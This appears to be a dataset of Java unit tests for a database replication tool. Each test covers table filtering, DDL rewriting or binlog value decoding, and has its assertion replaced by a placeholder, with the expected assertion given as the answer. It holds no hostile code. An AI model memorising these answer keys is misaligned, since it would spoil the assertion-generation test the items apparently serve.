"miss_DoTable_Hit_IgnoreTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""full_src_1""); rowChange.setTable(""t1""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_DoWildTable_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Miss_DoWildTable_Hit_IgnoreWildTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_DoDb_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, dutf8""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Miss_DoDb_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, full_src_2""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_IgnoreDb_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""full_src_1, dutf8""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Miss_IgnoreDb_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""full_src_1, full_src_2""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_DoWildTable_Hit_DoDb_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, dutf8""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_DoWildTable_Miss_DoDb_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, full_src_2""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_DoWildTable_Hit_IgnoreDb_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""full_src_1, dutf8""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Hit_DoWildTable_Miss_IgnoreDb_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""full_src_1, full_src_2""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"no_DoTable_Hit_DoDb_Hit_WildDoTable_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, rpl, dutf8""); replicaMeta.setIgnoreDb(""full_src_1, rpl, dutf8""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"no_DoTable_No_DoDb_Miss_IgnoreTable_Miss_IgnoreDb_Hit_WildDoTable_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""full_src_1, rpl""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, rpl""); replicaMeta.setIgnoreDb(""full_src_1, rpl""); replicaMeta.setDoTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  // Hit Replicate_Do_Table rowChange.setSchema(""full_src_1""); rowChange.setTable(""t3""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"no_DoTable_Hit_DoDb_Miss_WildDoTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, rpl, dutf8""); replicaMeta.setIgnoreDb(""full_src_1, rpl, dutf8""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""full_src_1""); rowChange.setTable(""t1""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"no_DoTable_Miss_DoDb_Hit_WildDoTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, rpl""); replicaMeta.setIgnoreDb(""full_src_1, rpl""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"no_DoTable_No_DoDb_Hit_IgnoreDb_Hit_WildDoTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""full_src_1, dutf8""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  // Hit Replicate_Do_Table rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertTrue(filter.ignoreEvent(rowChange))
"no_DoTable_No_DoDb_Miss_IgnoreTable_Miss_IgnoreDb_Miss_WildDoTable_Ignore() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""dutf8""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""%.tb\\_charset, d%.col_charset%, %sub%.%,%.%sub%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange1 = new DefaultRowChange(); rowChange1.setAction(DBMSAction.INSERT); // Hit Replicate_Do_Table rowChange1.setSchema(""full_src_1""); rowChange1.setTable(""tb_charset"");  DefaultRowChange rowChange2 = new DefaultRowChange(); rowChange2.setAction(DBMSAction.INSERT); // Hit Replicate_Do_Table rowChange2.setSchema(""full_src_1""); rowChange2.setTable(""tb1charset""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange2))
"testGetStateMachineDetail() { ResultCode<DataImportTaskDetailInfo> ret = FSMMetaManager.getStateMachineDetail(1); Assert.""<AssertPlaceHolder>""; }
getStateMachineDetail(long FSMId) { RplStateMachine stateMachine = DbTaskMetaManager.getStateMachine(FSMId); if (stateMachine == null) { defaultLogger.error(""from id: {} , fsm not found"", FSMId); return new ResultCode<>(RplConstants.FAILURE_CODE, ""fsm not found"", new DataImportTaskDetailInfo()); } ResultCode<DataImportTaskDetailInfo> returnResult = new ResultCode<>(RplConstants.SUCCESS_CODE, ""success""); DataImportTaskDetailInfo info = new DataImportTaskDetailInfo(); info.setFsmId(stateMachine.getId()); info.setFsmState(stateMachine.getState()); info.setFsmStatus(stateMachine.getStatus()); info.setServiceDetailList(new ArrayList<>()); List<RplService> services = DbTaskMetaManager.listService(FSMId); for (RplService service : services) { ServiceDetail serviceDetail = new ServiceDetail(); serviceDetail.setId(service.getId()); serviceDetail.setStatus(service.getStatus()); serviceDetail.setType(service.getServiceType()); serviceDetail.setTaskDetailList(new ArrayList<>()); List<RplTask> tasks = DbTaskMetaManager.listTaskByService(service.getId()); for (RplTask task : tasks) { serviceDetail.getTaskDetailList().add(getTaskSpecificDetail(task)); } info.getServiceDetailList().add(serviceDetail); } returnResult.setData(info); return returnResult; }"	assertNotNull(ret)
"testLineWrap() { String sql = ""CREATE TABLE `cloud_hanging_user_pack` (\n"" + ""  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '人群包配置id',\n"" + ""  `name` varchar(40) NOT NULL DEFAULT '' COMMENT '人群包名称',\n"" + ""  `pack_comment` varchar(40) NOT NULL DEFAULT '' COMMENT '备注\\n',\n"" + ""  `original_count` bigint(11) NOT NULL DEFAULT '0' COMMENT '原始人数',\n"" + ""  `effective_count` bigint(11) NOT NULL DEFAULT '0' COMMENT '有效人数',\n"" + ""  `orginal_url` varchar(100) NOT NULL DEFAULT '' COMMENT '原始人群包下载地址',\n"" + ""  `effective_url` varchar(100) NOT NULL DEFAULT '' COMMENT '有效人群包',\n"" + ""  PRIMARY KEY (`id`) USING BTREE\n"" + "") ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='云挂机人群包配置';"";  String convertSql = buildDdlEventSql(sql, ""utf8"", ""utf8"", ""123456""); convertSql = extractPolarxOriginSql(convertSql, false); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSql(String polarxDDL, String dbCharset, String tbCollation, String tso) { return buildDdlEventSql(null, polarxDDL, dbCharset, tbCollation, tso, null, null); }"	"assertFalse(StringUtils.contains(convertSql, ""\n""))"
"testModifyWithTableGroup() { String ddl = ""ALTER TABLE t_modify MODIFY COLUMN b mediumint WITH TABLEGROUP=tg1216 IMPLICIT, "" + ""INDEX gsi_2 WITH TABLEGROUP=tg1221 IMPLICIT, INDEX gsi_1 WITH TABLEGROUP=tg1219 IMPLICIT""; StringBuilder sb = new StringBuilder(); buildDdlEventSqlForMysqlPart(sb, ""t_modify"", ""utf8mb4"", ""utf8_general_cs"", ddl); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSqlForMysqlPart(StringBuilder sqlBuilder, String tableName, String dbCharset, String tbCollation, String ddlSqlForNormalMysql) { buildDdlEventSqlForMysqlPart(sqlBuilder, tableName, dbCharset, tbCollation, ddlSqlForNormalMysql, null); }"	"assertEquals(""ALTER TABLE t_modify MODIFY COLUMN b mediumint"", sb.toString())"
"testRemoveIndexVisible() { String sql = ""CREATE TABLE t_order ( "" + ""`id` bigint(11), "" + ""`order_id` varchar(20),"" + ""`buyer_id` varchar(20), "" + ""INDEX `g_order_id`(order_id) INVISIBLE  ) DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci""; StringBuilder sb = new StringBuilder(); buildDdlEventSqlForMysqlPart(sb, ""wp_users_user_email"", ""utf8mb4"", ""utf8_general_cs"", sql); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSqlForMysqlPart(StringBuilder sqlBuilder, String tableName, String dbCharset, String tbCollation, String ddlSqlForNormalMysql) { buildDdlEventSqlForMysqlPart(sqlBuilder, tableName, dbCharset, tbCollation, ddlSqlForNormalMysql, null); }"	"assertEquals( ""CREATE TABLE `wp_users_user_email` ( "" + ""`id` bigint(11), "" + ""`order_id` varchar(20), "" + ""`buyer_id` varchar(20), "" + ""INDEX `g_order_id`(order_id) ) DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci"", sb.toString())"
"testAutoIncrementUnitCount() { String sql = ""CREATE TABLE group_seq_unit_partition ( id int PRIMARY KEY AUTO_INCREMENT UNIT COUNT 4 INDEX 3 ) "" + ""DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci""; StringBuilder sb = new StringBuilder(); buildDdlEventSqlForMysqlPart(sb, ""t_modify"", ""utf8mb4"", ""utf8_general_cs"", sql); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSqlForMysqlPart(StringBuilder sqlBuilder, String tableName, String dbCharset, String tbCollation, String ddlSqlForNormalMysql) { buildDdlEventSqlForMysqlPart(sqlBuilder, tableName, dbCharset, tbCollation, ddlSqlForNormalMysql, null); }"	"assertEquals(""CREATE TABLE `t_modify` ("" + "" id int PRIMARY KEY AUTO_INCREMENT ) DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci"", sb.toString())"
"testColumnarIndex() { String sql = ""CREATE TABLE `check_cci_meta_test_prim_auto_1` ( "" + ""`pk` int(11) NOT NULL AUTO_INCREMENT, "" + ""`c1` int(11) DEFAULT NULL, "" + ""`c2` int(11) DEFAULT NULL, "" + ""`c3` int(11) DEFAULT NULL, "" + ""PRIMARY KEY (`pk`), "" + ""CLUSTERED COLUMNAR INDEX `check_cci_meta_test_cci_auto_1`(`c2`) WITH TABLEGROUP=columnar_tg1612 IMPLICIT ) "" + ""ENGINE = 'INNODB' DEFAULT CHARSET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci WITH TABLEGROUP = tg1611 IMPLICIT ""; StringBuilder sb = new StringBuilder(); buildDdlEventSqlForMysqlPart(sb, ""t_modify"", ""utf8mb4"", ""utf8_general_cs"", sql); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSqlForMysqlPart(StringBuilder sqlBuilder, String tableName, String dbCharset, String tbCollation, String ddlSqlForNormalMysql) { buildDdlEventSqlForMysqlPart(sqlBuilder, tableName, dbCharset, tbCollation, ddlSqlForNormalMysql, null); }"	"assertEquals( ""CREATE TABLE `t_modify` ( "" + ""`pk` int(11) NOT NULL AUTO_INCREMENT, "" + ""`c1` int(11) DEFAULT NULL, "" + ""`c2` int(11) DEFAULT NULL, "" + ""`c3` int(11) DEFAULT NULL, "" + ""PRIMARY KEY (`pk`), "" + ""INDEX `check_cci_meta_test_cci_auto_1`(`c2`) ) "" + ""ENGINE = 'INNODB' DEFAULT CHARSET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci"", sb.toString())"
"testDictionaryColumn() { String sql = ""CREATE TABLE `region` ("" + ""`r_regionkey` int(11) NOT NULL, "" + ""`r_name` varchar(25) NOT NULL, "" + ""`r_comment` varchar(152) DEFAULT NULL, "" + ""PRIMARY KEY (`r_regionkey`), "" + ""INDEX `region_col_index`(`r_regionkey`) DICTIONARY_COLUMNS = 'r_name' ) "" + ""ENGINE = 'INNODB' DEFAULT CHARSET = latin1 DEFAULT COLLATE = latin1_swedish_ci""; StringBuilder sb = new StringBuilder(); buildDdlEventSqlForMysqlPart(sb, ""t_modify"", ""utf8mb4"", ""utf8_general_cs"", sql); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSqlForMysqlPart(StringBuilder sqlBuilder, String tableName, String dbCharset, String tbCollation, String ddlSqlForNormalMysql) { buildDdlEventSqlForMysqlPart(sqlBuilder, tableName, dbCharset, tbCollation, ddlSqlForNormalMysql, null); }"	"assertEquals(""CREATE TABLE `t_modify` ( "" + ""`r_regionkey` int(11) NOT NULL, "" + ""`r_name` varchar(25) NOT NULL, "" + ""`r_comment` varchar(152) DEFAULT NULL, "" + ""PRIMARY KEY (`r_regionkey`), "" + ""INDEX `region_col_index`(`r_regionkey`) ) ENGINE = 'INNODB' DEFAULT CHARSET = latin1 DEFAULT COLLATE = latin1_swedish_ci"", sb.toString())"
"testAutoIncrementSep() { String sql = ""create table if not exists shardingDestWithGroup5_fn4n ("" + ""c1 int auto_increment unit count 1 index 0 step 100, "" + ""c2 int, primary key (c1)) dbpartition by hash(c1)""; StringBuilder sb = new StringBuilder(); buildDdlEventSqlForMysqlPart(sb, ""shardingdestwithgroup5_fn4n"", ""utf8mb4"", ""utf8mb4_general_ci"", sql); Assert.""<AssertPlaceHolder>""; }
buildDdlEventSqlForMysqlPart(StringBuilder sqlBuilder, String tableName, String dbCharset, String tbCollation, String ddlSqlForNormalMysql) { buildDdlEventSqlForMysqlPart(sqlBuilder, tableName, dbCharset, tbCollation, ddlSqlForNormalMysql, null); }"	"assertEquals( ""CREATE TABLE IF NOT EXISTS `shardingdestwithgroup5_fn4n` ( "" + ""c1 int AUTO_INCREMENT, "" + ""c2 int, PRIMARY KEY (c1) ) DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = utf8mb4_general_ci"", sb.toString())"
"testEnum() { setConfig(ConfigKeys.TASK_EXTRACT_REBUILD_DATA_LOG, ""true""); Field field = MakeFieldFactory.makeField(""enum('x-small','small','medium','large','x-large')"", ""x-large"", ""utf8"", false, false); RowDataRebuildLogger logger = new RowDataRebuildLogger(); Serializable s = logger.doDecode(field.getMysqlType().getType(), field.doGetTableMeta(), field.encode(), ""utf8"", false); Assert.""<AssertPlaceHolder>""; }
doDecode(int type, byte[] meta, byte[] data, String charset, boolean isUnsigned) { int m = decodeMeta(type, meta); String javaCharset = CharsetConversion.getJavaCharset(charset); return logBuffer .fetchValue(type, m, false, new LogBuffer(data, 0, data.length), javaCharset, isUnsigned); }"	assertEquals(5, s)
"testDecimal() { setConfig(ConfigKeys.TASK_EXTRACT_REBUILD_DATA_LOG, ""true""); float b = 23.1415f; Field field = MakeFieldFactory.makeField(""decimal(10,3)"", b + """", ""utf8"", false, false); RowDataRebuildLogger logger = new RowDataRebuildLogger(); Serializable s = logger.doDecode(field.getMysqlType().getType(), field.doGetTableMeta(), field.encode(), ""utf8"", false); Assert.""<AssertPlaceHolder>""; }
doDecode(int type, byte[] meta, byte[] data, String charset, boolean isUnsigned) { int m = decodeMeta(type, meta); String javaCharset = CharsetConversion.getJavaCharset(charset); return logBuffer .fetchValue(type, m, false, new LogBuffer(data, 0, data.length), javaCharset, isUnsigned); }"	"assertEquals(new BigDecimal(""23.141""), s)"
